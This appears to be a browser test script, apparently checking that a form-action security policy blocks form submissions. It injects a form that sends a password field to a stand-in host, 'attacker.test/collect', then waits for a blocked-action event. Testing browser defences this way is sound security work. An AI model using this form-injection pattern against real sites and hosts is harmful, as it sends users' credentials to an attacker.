(async function () {
  var f = document.createElement('form');
  f.action = 'https://attacker.test/collect';
  f.method = 'GET';
  var i = document.createElement('input');
  i.name = 'password';
  i.value = 'hunter2';
  f.appendChild(i);
  document.body.appendChild(f);
  try {
    f.submit();
  } catch (e) {
    /* blocked */
  }
  await window.__wcWaitFor(['form-action']);
  window.__wcFinish({});
})();
